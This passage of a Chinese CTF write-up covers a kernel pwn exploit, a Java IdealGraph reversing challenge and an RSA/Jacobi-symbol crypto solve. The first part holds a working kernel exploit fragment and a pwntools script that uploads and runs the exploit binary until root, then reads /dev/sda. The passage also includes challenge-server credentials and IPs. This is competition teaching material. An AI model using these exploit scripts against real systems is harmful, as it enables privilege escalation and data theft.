    <span class="hljs-built_in">memset</span>(d.buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(d.buf));
    <span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>;
    d.size = <span class="hljs-number">0x100</span>;
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exploit!&quot;</span>);
    <span class="hljs-built_in">ioctl</span>(fd,<span class="hljs-number">0x666</span>,&amp;d);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64
context(log_level=<span class="hljs-string">&#x27;info&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)

BIN = <span class="hljs-string">&quot;./fs/exp&quot;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_cmd</span>(<span class="hljs-params">sh, cmd</span>):</span>
    sh.sendline(cmd)
    sh.recvuntil(<span class="hljs-string">&quot;$ &quot;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    <span class="hljs-comment"># sh = ssh(host=&quot;159.75.250.50&quot;, user=&quot;ctf&quot;, password=&quot;tctf2021&quot;).run(&quot;/bin/sh&quot;)</span>
    sh = process(<span class="hljs-string">&quot;./run.sh&quot;</span>)
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(BIN, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
        data = f.read()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;upload&quot;</span>)
    <span class="hljs-comment"># sh.upload_data(data, &quot;/home/ctf/exp&quot;)</span>

    total = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sh.recvuntil(<span class="hljs-string">&quot;~ $ &quot;</span>, timeout=<span class="hljs-number">5</span>)) == <span class="hljs-number">0</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Root!&quot;</span>)
            sh.sendline(<span class="hljs-string">&quot;cat /dev/sda&quot;</span>)
            sh.interactive()
        encoded = base64.b64encode(data)
        once_size = <span class="hljs-number">0x200</span>
        count = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encoded), once_size):
            sh.sendline(<span class="hljs-string">&quot;echo -n \&quot;%s\&quot; &gt;&gt; benc&quot;</span> % (encoded[i:i+once_size].decode()))
            <span class="hljs-comment"># print (float(i)/len(encoded))</span>
            count += <span class="hljs-number">1</span>
        sh.sendline(<span class="hljs-string">&quot;cat benc | base64 -d &gt; exp&quot;</span>)
        sh.sendline(<span class="hljs-string">&quot;chmod +x exp&quot;</span>)
        sh.sendline(<span class="hljs-string">&quot;./exp&quot;</span>)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, count + <span class="hljs-number">2</span>):
            sh.recvuntil(<span class="hljs-string">&quot;~ $ &quot;</span>)
        total += <span class="hljs-number">1</span>
        <span class="hljs-built_in">print</span>(total)

    <span class="hljs-comment"># context(log_level=&#x27;error&#x27;)</span>
    sh.interactive()</code></pre><h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
<h3 id="bali"><a class="header-link" href="#bali"></a>bali</h3>
<p>一个 Java 的逆向题，但是并没有给 Java 字节码，而是给了 openjdk 的中间语言 IdealGraph 的表示。</p>
<p>大概长这样：</p>
<pre class="hljs"><code><span class="hljs-number"> 1874 </span> LoadI  === <span class="hljs-number"> 377 </span><span class="hljs-number"> 1875 </span><span class="hljs-number"> 1281 </span> [[<span class="hljs-number"> 1871 </span>]]  @int[int:&gt;=0]:exact+any *, idx=6; <span class="hljs-comment">#int !orig=1288,1127,710,[1171],[967] !jvms: Task::f @ bci:192 (line 25)</span>
<span class="hljs-number"> 1870 </span> LoadI  === <span class="hljs-number"> 377 </span><span class="hljs-number"> 1871 </span><span class="hljs-number"> 1283 </span> [[<span class="hljs-number"> 1869 </span>]]  @int[int:&gt;=0]:exact+any *, idx=6; <span class="hljs-comment">#int !orig=1282,710,[1171],[967] !jvms: Task::f @ bci:192 (line 25)</span>
<span class="hljs-number"> 1871 </span> StoreI  === <span class="hljs-number"> 377 </span><span class="hljs-number"> 1875 </span><span class="hljs-number"> 336 </span><span class="hljs-number"> 1874 </span> [[<span class="hljs-number"> 1869 </span><span class="hljs-number"> 1870 </span>]]  @int[int:&gt;=0]:exact+any *, idx=6;  Memory: @int[int:20]:NotNull:exact[0] *, idx=6; !orig=1286,1125,729,[1140] !jvms: Task::f @ bci:193 (line 25)
<span class="hljs-number"> 1868 </span> LoadI  === <span class="hljs-number"> 377 </span><span class="hljs-number"> 1869 </span><span class="hljs-number"> 1474 </span> [[<span class="hljs-number"> 1867 </span>]]  @int[int:&gt;=0]:exact+any *, idx=6; <span class="hljs-comment">#int !orig=1568,1315,1127,710,[1171],[967] !jvms: Task::f @ bci:192 (line 25)</span></code></pre><p>IdealGraph 的资料并不太多，可以从 openjdk 的 wiki 找到一点点资料，像<a href="https://wiki.openjdk.java.net/display/HotSpot/C2+IR+Graph+and+Nodes">这里</a> 有为数不多的总体性资料。</p>
<p>（如果了解 JVM 的 IR 的历史就会知道，事实上 JVM 的 IR 设计（openjdk），也就是 Ideal Graph 的设计和 v8 的 sea of nodes 是同一个设计者，两者在整体设计上有许多相通之处。）</p>
<p>这个 IR 是一个图结构，每一行对应一个node ，左边是 node 自己的 ID ，&quot;===&quot; 右侧的 3 个数字是 input ，中括号中的是 output 。
可以从 openjdk 的<a href="https://github.com/openjdk/jdk/tree/master/src/hotspot/share/opto">源码</a> 找到每一个 node 的具体语义，可以从代码和注释中大概看明白。</p>
<p>然而本体逆向的难点主要在于，整个图结构是比较大的，如果直接看，很难看明白图的结构。好在，高等级版本的 JDK ，IR dump 出来有行数信息，如本题就有，所以可以通过行数信息将每一行拆开来看，这样就可以让逆向的难度稍微降低一点。</p>
<p>具体的每一个 node 的语义就不赘述了，可以通过代码自行看明，这里只简单列举几个重要的点：</p>
<ul class="list">
<li>类型在 node 里已经指明了，例如 &quot;LoadI&quot; 就是 int 类型</li>
<li>为方便分析，这种 IR 的设计将内存副作用直接表示在了 IR 当中以避免指针分析复杂难做：Load/Store 的节点的输出是一个由该操作进行之后所形成的内存状态。举例来说，Store 节点的参数分别是：&quot;控制流参数，内存状态，地址，值&quot;，例如<code>Store C, MEM, a+100, 100</code> （伪代码）得到了一个新的内存状态，在这个状态中，相当于将原来的 <code>MEM</code> 状态（初始状态，或是另一个 Store 产生的内存状态）中的 <code>a+100</code> 地址对应的值替换为了 100 。这个新的内存状态又可以用于 Store 或是 Load 。通过这样的方式，内存的副作用就完全被涵盖在了 IR 中，可以直接看出，但是对于我们来说，逆向时，错误的内存状态可能导致错误的逆向结果。举例来讲：<code>a[10] = 200; c = a[10]; a[10] = 100; x = c;</code> 这时，如果只看语句顺序，在 IR 中，<code>x = a</code> 依赖的内存状态是 <code>c = a</code> 之前的状态，但是语句顺序却在之后，所以 <code>x</code> 应该是 200 而不是 100。（好在，本题里边居然没用到这个点，所以让实际情况变得更简单了）</li>
<li>IR 也带有 SSA 的性质，有 Phi node。循环、if 将会生成 Phi node。</li>
<li>merge mem其实不管也不怎么影响，还挺复杂的。。。</li>
</ul>
<p>为逆向方便，我的方法是，按照每一行，将图画出来，这样会得到一个一个的子图，这样一行一行翻译。由于题目本身量比较小，所以这样的方法十分可行。</p>
<p>可视化的脚本如下：</p>
<pre class="hljs"><code><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;mylog.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
    content = f.read()

which_line = <span class="hljs-string">&#x27;line 20&#x27;</span> <span class="hljs-comment"># 这里一行一行的修改，开头两行 用 &quot;#&quot; 号注释掉</span>

graph = []

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ignore</span>(<span class="hljs-params">line</span>):</span>
    included = [
        <span class="hljs-string">&#x27;Add&#x27;</span>,
        <span class="hljs-string">&#x27;Shift&#x27;</span>,
        <span class="hljs-string">&#x27;Store&#x27;</span>,gg
        <span class="hljs-string">&#x27;Load&#x27;</span>
    ]

    equals = []

    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> included:
        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> line:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> equals:
        <span class="hljs-keyword">if</span> x == line:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

table = {}

<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> content.splitlines():
    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&#x27;#&#x27;</span>):
        <span class="hljs-keyword">continue</span>

    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line.strip()) == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">continue</span>

    orig_line = line
    line = line.split(<span class="hljs-string">&#x27;]]&#x27;</span>)[<span class="hljs-number">0</span>]

    part1 = line.split(<span class="hljs-string">&#x27;===&#x27;</span>)[<span class="hljs-number">0</span>]
    <span class="hljs-built_in">print</span>(line)
    part2 = line.split(<span class="hljs-string">&#x27;===&#x27;</span>)[<span class="hljs-number">1</span>]

    num, op = part1.split()


    ins, out = part2.split(<span class="hljs-string">&#x27;[[&#x27;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_int</span>(<span class="hljs-params">x</span>):</span>
        <span class="hljs-keyword">if</span> x == <span class="hljs-string">&#x27;_&#x27;</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(x)

    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;CallStaticJava&#x27;</span> <span class="hljs-keyword">in</span> line:
        op = <span class="hljs-string">&#x27;CallStaticJava: {}&#x27;</span>.<span class="hljs-built_in">format</span>(orig_line.split(<span class="hljs-string">&#x27;#&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;c=&#x27;</span>)[<span class="hljs-number">0</span>])
        part2 = part2.split(<span class="hljs-string">&#x27;(&#x27;</span>)[<span class="hljs-number">0</span>] + part2.split(<span class="hljs-string">&#x27;)&#x27;</span>)[<span class="hljs-number">1</span>]

    ins, out = part2.split(<span class="hljs-string">&#x27;[[&#x27;</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;returns&#x27;</span> <span class="hljs-keyword">in</span> line:
        ins, out = part2.split(<span class="hljs-string">&#x27;[[&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;returns&#x27;</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;exception&#x27;</span> <span class="hljs-keyword">in</span> line:
        ins, out = part2.split(<span class="hljs-string">&#x27;[[&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;exception&#x27;</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ConL&#x27;</span> <span class="hljs-keyword">in</span> orig_line:
        con_value = orig_line.split(<span class="hljs-string">&#x27;#&#x27;</span>)[<span class="hljs-number">1</span>]


    ins = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(to_int, ins.split()))
    out = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(to_int, out.split()))

    <span class="hljs-keyword">if</span> ignore(op):
        <span class="hljs-keyword">continue</span>


    table[num] = op
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ConL&#x27;</span> <span class="hljs-keyword">in</span> orig_line:
        table[num] = op + <span class="hljs-string">&#x27;:{}&#x27;</span>.<span class="hljs-built_in">format</span>(con_value)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> which_line <span class="hljs-keyword">in</span> orig_line:
        <span class="hljs-keyword">continue</span>

    <span class="hljs-built_in">print</span>(orig_line)

    graph.append((num, op, ins, out))

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;log.dot&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&#x27;digraph {&#x27;</span>)
    printed = []
    <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> graph:
        num, op, ins, out = g
        f.write(<span class="hljs-string">&#x27;{} [label=&quot;{} {}&quot;]\n&#x27;</span>.<span class="hljs-built_in">format</span>(num, num, op))
        printed.append(num)

    out_printed = []

    <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> graph:
        num, op, ins, out = g
        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> out:
            <span class="hljs-keyword">if</span> o:
                f.write(<span class="hljs-string">&#x27;{} -&gt; {};\n&#x27;</span>.<span class="hljs-built_in">format</span>(num, o))
                out_printed.append((num, o))

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ins:
            <span class="hljs-keyword">if</span> i:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> printed:
                    f.write(<span class="hljs-string">&#x27;{} [label=&quot;{} {}&quot;]\n&#x27;</span>.<span class="hljs-built_in">format</span>(i, i, table[<span class="hljs-built_in">str</span>(i)]))
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (i, num) <span class="hljs-keyword">in</span> out_printed:
                    f.write(<span class="hljs-string">&#x27;{} -&gt; {};\n&#x27;</span>.<span class="hljs-built_in">format</span>(i, num))
                    out_printed.append((i, num))


    f.write(<span class="hljs-string">&#x27;}&#x27;</span>)
        </code></pre><p>之后通过 <code>dot log.dot -Tpng &gt; xx.png</code> 就可以画出图然后一行一行翻译。</p>
<p>其中比较难的在于两个被 unroll 的循环，由于是常量级的循环（循环的次数固定且不算大），被 unroll 了，如果对优化的算法足够敏感应该能看出来。否则可能会影响一点（会觉得例如 24 行的操作很奇怪，看不懂）。
如果实在看不出来是循环 unroll 问题其实也不大，按照 addr 的规律一个一个推就好了。这个点好在，因为没有出现之前提到的用 MEM 的状态去确定是哪个变量，所以按照顺序翻译不会出现问题，否则的话翻译过程会复杂不少，需要关注每一个内存状态。</p>
<p>比较可惜的是，由于个人疏忽，将 &quot;-256&quot; 想当然写成了 &quot;256&quot;（0xff），导致这个题本来在第一天基本就做到最后一步的，一直卡住，耽误了大量时间。</p>
<p>最后翻译的结果：</p>
<pre class="hljs"><code>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">f</span><span class="hljs-params">(String inp)</span> </span>{ <span class="hljs-comment">// thread_local + 280</span>
        <span class="hljs-keyword">if</span> (inp != <span class="hljs-keyword">null</span>) {
            <span class="hljs-keyword">if</span> (inp.length() != <span class="hljs-number">21</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!inp.substring(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>).equals(<span class="hljs-string">&quot;0ops{&quot;</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (inp.charAt(<span class="hljs-number">20</span>) == <span class="hljs-number">125</span>) <span class="hljs-comment">// 189</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
            <span class="hljs-keyword">int</span>[] a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">20</span>];
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">5</span>; i &lt; <span class="hljs-number">20</span>; i++) { <span class="hljs-comment">// 1027 - 307 loop</span>
                a[i - <span class="hljs-number">5</span>] = inp.charAt(i);
            }
            <span class="hljs-keyword">int</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">20</span>];
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">1234</span>; i++) { <span class="hljs-comment">// 1033 - 3032 loop; i = phi(1033, 46, 746)</span>
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">14</span>; ++j) {<span class="hljs-comment">// int[] wtf27 = ?; //  442 loop unrolling?</span>
                    b[j] = a[j + <span class="hljs-number">1</span>];<span class="hljs-comment">// b[4] = a[5]; /* 1920 */ b[5] = a[6]; /* 1917 */ b[6] = a[7]; /* 1915 */ b[7] = a[8]; /* 1907 */ b[8] = a[9]; /* 1905 */ b[9] = a[10]; /* 1903 */ b[10] = a[11]; /* 1901 */ b[11] = a[12]; /* 1897 */ b[12] = a[13]; /* 1895 */ b[13] = a[14]; /* 1893 */ b[14] = a[15]; /* 1890 */ b[15] = a[16]; /* 1882 */ b[16] = a[17]; /* 1877 */ b[17] = a[18]; /* 1875 */ // 1217</span>
                }<span class="hljs-comment">// guess: loop unrolling, 16-18</span>
                <span class="hljs-keyword">int</span> id1918 = b[<span class="hljs-number">1</span>] &amp; b[<span class="hljs-number">0</span>]; <span class="hljs-comment">//int id1918 = b[1] &amp; b[0];</span>
                <span class="hljs-keyword">int</span> wtf20_temp = id1918 + b[<span class="hljs-number">3</span>]; <span class="hljs-keyword">int</span> wtf20 = (wtf20_temp - ((wtf20_temp + ((wtf20_temp &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt;&gt; <span class="hljs-number">24</span>) &amp; -<span class="hljs-number">256</span>))); <span class="hljs-comment">/* 1908, 591 */</span>
                <span class="hljs-keyword">int</span> id1891 = (b[<span class="hljs-number">5</span>] | b[<span class="hljs-number">7</span>]) ^ wtf20;
                <span class="hljs-keyword">int</span> id1888 = id1891 + b[<span class="hljs-number">10</span>] + b[<span class="hljs-number">11</span>]; <span class="hljs-keyword">int</span> id1883 = id1888 - ((((id1888 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt;&gt; <span class="hljs-number">24</span>) + id1888) &amp; -<span class="hljs-number">256</span>);
                <span class="hljs-keyword">int</span> temp1872 = a[<span class="hljs-number">0</span>] ^ id1883;
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">14</span>; ++j) {<span class="hljs-comment">// unrolling?</span>
                    a[j] = a[j + <span class="hljs-number">1</span>];<span class="hljs-comment">// a[4] = a[5]; /* 1871 */ a[5] = a[6]; /* 1869 */ /* ... */ a[17] = a[18];</span>
                }<span class="hljs-comment">// guess: loop unrolling 24 - 26</span>
                a[<span class="hljs-number">14</span>] = temp1872; <span class="hljs-comment">/* 1844 */</span>

            } <span class="hljs-comment">/* 997: phi 1844(745) */</span>
            <span class="hljs-keyword">if</span> (a[<span class="hljs-number">14</span>] != <span class="hljs-number">155</span> || a[<span class="hljs-number">0</span>] != <span class="hljs-number">187</span>||a[<span class="hljs-number">12</span>] != <span class="hljs-number">106</span>||a[<span class="hljs-number">8</span>] != <span class="hljs-number">131</span>||a[<span class="hljs-number">2</span>] != <span class="hljs-number">20</span>||a[<span class="hljs-number">1</span>] != <span class="hljs-number">169</span>||a[<span class="hljs-number">10</span>] != <span class="hljs-number">239</span>||a[<span class="hljs-number">5</span>] != <span class="hljs-number">94</span>||a[<span class="hljs-number">11</span>] != <span class="hljs-number">63</span>||a[<span class="hljs-number">3</span>] != <span class="hljs-number">23</span>||a[<span class="hljs-number">7</span>] != <span class="hljs-number">117</span>||a[<span class="hljs-number">6</span>] != <span class="hljs-number">107</span>||a[<span class="hljs-number">13</span>] != <span class="hljs-number">112</span>||a[<span class="hljs-number">4</span>] != <span class="hljs-number">100</span>||a[<span class="hljs-number">9</span>] != <span class="hljs-number">108</span>) { 
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        <span class="hljs-comment">/* some code here */</span>
    }</code></pre><p>到这一步就比较简单了，直接逆推就好了。</p>
<pre class="hljs"><code><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
        <span class="hljs-keyword">int</span>[] a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">20</span>];
        a[<span class="hljs-number">14</span>] = <span class="hljs-number">155</span>;
        a[<span class="hljs-number">0</span>] = <span class="hljs-number">187</span>;
        a[<span class="hljs-number">12</span>] = <span class="hljs-number">106</span>;
        a[<span class="hljs-number">8</span>] = <span class="hljs-number">131</span>;
        a[<span class="hljs-number">2</span>] = <span class="hljs-number">20</span>;
        a[<span class="hljs-number">1</span>] = <span class="hljs-number">169</span>;
        a[<span class="hljs-number">10</span>] = <span class="hljs-number">239</span>;
        a[<span class="hljs-number">5</span>] = <span class="hljs-number">94</span>;
        a[<span class="hljs-number">11</span>] = <span class="hljs-number">63</span>;
        a[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span>;
        a[<span class="hljs-number">7</span>] = <span class="hljs-number">117</span>;
        a[<span class="hljs-number">6</span>] = <span class="hljs-number">107</span>;
        a[<span class="hljs-number">13</span>] = <span class="hljs-number">112</span>;
        a[<span class="hljs-number">4</span>] = <span class="hljs-number">100</span>;
        a[<span class="hljs-number">9</span>] = <span class="hljs-number">108</span>;

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1234</span>; ++i) {
            <span class="hljs-keyword">int</span> id1872 = a[<span class="hljs-number">14</span>];

            <span class="hljs-keyword">int</span> id1918 = a[<span class="hljs-number">1</span>] &amp; a[<span class="hljs-number">0</span>];
            <span class="hljs-keyword">int</span> wtf20_temp = id1918 + a[<span class="hljs-number">3</span>];
            <span class="hljs-keyword">int</span> wtf20 = wtf20_temp - ((wtf20_temp + ((wtf20_temp &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt;&gt; <span class="hljs-number">24</span>)) &amp; -<span class="hljs-number">256</span>);
            <span class="hljs-keyword">int</span> id1891 = (a[<span class="hljs-number">5</span>] | a[<span class="hljs-number">7</span>]) ^ wtf20;
            <span class="hljs-keyword">int</span> id1888 = id1891 + a[<span class="hljs-number">10</span>] + a[<span class="hljs-number">11</span>];
            <span class="hljs-keyword">int</span> id1883 = id1888 - ((((id1888 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt;&gt; <span class="hljs-number">24</span>) + id1888) &amp; -<span class="hljs-number">256</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">13</span>; j &gt;= <span class="hljs-number">0</span>; j--) {
                a[j + <span class="hljs-number">1</span>] = a[j];
            }
            a[<span class="hljs-number">0</span>] = id1883 ^ id1872;
        }

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; ++i) {
            System.out.print((<span class="hljs-keyword">char</span>)a[i]);
        }

    }
}</code></pre><p>(BTW ((x &gt;&gt; 31) &gt;&gt;&gt; 24) &amp; -256 其实是 sign ，thanks to liangjs)</p>
<h3 id="halfhalf"><a class="header-link" href="#halfhalf"></a>halfhalf</h3>
<p>逆向部分：</p>
<p>PoW部分验证输入的前四字节的的sha256的后3字节与输出的内容相同。</p>
<p>Magic Word部分将输入直接与常量比对，直接提取出来即可,为<code>🐶🍐🍳🏠🐣💀💺👈👉🏁🦅🔥🪓👃🎶📄</code>。</p>
<p>程序先初始化了质数p和q,和一个上限<code>1&lt;&lt;513-1</code>。在这个范围内随机生成了一个数v40。</p>
<p>菜单说明：</p>
<ol class="list">
<li>输出p*q</li>
<li>有一个随机数v40 若输入&gt;=v40 <code>c=(rand()**2)*9*2</code> 否则<code>c= (rand()**2)*9</code>，然后输出<code>pow(c,65537,p*q)</code></li>
<li>输出旧的v40，然后重新随机生成一个v40</li>
<li>若输入的是v40则输出flag 否则退出程序</li>
<li>退出</li>
</ol>
<p>crypto部分：</p>
<p>由于*9和*9*2最大的区别是是否为平方数，那么在pow下，我们计算一个雅可比符号就可以判断他和v40的大小，从而二分法逼近</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> hashlib,itertools,string
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> gmpy2
<span class="hljs-comment">#context.log_level=&quot;debug&quot;</span>

<span class="hljs-comment">#io=process(&quot;./debug&quot;)</span>
io=remote(<span class="hljs-string">&quot;121.5.253.92&quot;</span>,<span class="hljs-number">34567</span>)

<span class="hljs-comment"># pass pow</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pass_pow</span>():</span>

    io.recvuntil(<span class="hljs-string">&quot;&lt;3\n&quot;</span>)
    rr=<span class="hljs-built_in">str</span>(io.readline().strip(),encoding = <span class="hljs-string">&quot;utf8&quot;</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fuck:&quot;</span>,rr)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(string.printable,<span class="hljs-number">4</span>):
        <span class="hljs-comment">#print(hashlib.sha256(&quot;&quot;.join(i).encode()).hexdigest()[-6:],rr)</span>
        <span class="hljs-keyword">if</span> hashlib.sha256(<span class="hljs-string">&quot;&quot;</span>.join(i).encode()).hexdigest()[-<span class="hljs-number">6</span>:] == rr:
            result=<span class="hljs-string">&quot;&quot;</span>.join(i)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pass_pow:&quot;</span>+result)
            io.writeline(result)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;error&#x27;</span>)
pass_pow()

<span class="hljs-comment"># magic word</span>
io.recvuntil(<span class="hljs-string">&quot;Tell me the magic words: &quot;</span>)
io.writeline(<span class="hljs-string">&quot;🐶🍐🍳🏠🐣💀💺👈👉🏁🦅🔥🪓👃🎶📄&quot;</span>)

<span class="hljs-comment"># get n</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert_emoji_to_number</span>(<span class="hljs-params">emojistr</span>):</span>
    d=<span class="hljs-string">&quot;🍐🍳🎶🏁🏠🐣🐶👃👈👉💀💺📄🔥🦅🪓&quot;</span>
    result=<span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> emojistr:
        <span class="hljs-comment">#print(i,d.index(i))</span>
        result=(result&lt;&lt;<span class="hljs-number">4</span>)+d.index(i)
    <span class="hljs-keyword">return</span> result
io.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
io.writeline(<span class="hljs-string">&quot;1&quot;</span>)
io.recvuntil(<span class="hljs-string">&quot;🔒:&quot;</span>)
oo=<span class="hljs-built_in">str</span>(io.readline().strip(),encoding=<span class="hljs-string">&quot;utf8&quot;</span>)
n=convert_emoji_to_number(oo)

<span class="hljs-comment"># get v40 and reset</span>
io.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
io.writeline(<span class="hljs-string">&quot;3&quot;</span>)
oo=<span class="hljs-built_in">str</span>(io.readline().strip(),encoding=<span class="hljs-string">&quot;utf8&quot;</span>)
v40=convert_emoji_to_number(oo)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v40:&quot;</span>,v40)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;##&quot;</span>)

<span class="hljs-comment"># io func</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert_number_to_emoji</span>(<span class="hljs-params">number</span>):</span>
    d=<span class="hljs-string">&quot;🍐🍳🎶🏁🏠🐣🐶👃👈👉💀💺📄🔥🦅🪓&quot;</span>
    result=<span class="hljs-string">&quot;&quot;</span>
    tmp=number
    <span class="hljs-keyword">while</span> tmp!=<span class="hljs-number">0</span>:
        result=d[tmp%<span class="hljs-number">16</span>]+result
        tmp=(tmp&gt;&gt;<span class="hljs-number">4</span>)
    <span class="hljs-keyword">return</span> result

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">put_up</span>(<span class="hljs-params">v40</span>):</span>
    io.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
    io.writeline(<span class="hljs-string">&quot;2&quot;</span>)
    io.recvuntil(<span class="hljs-string">&quot;❔:&quot;</span>)
    io.writeline(convert_number_to_emoji(v40))
    checkstr=<span class="hljs-built_in">str</span>(io.readline().strip(),encoding=<span class="hljs-string">&quot;utf8&quot;</span>)
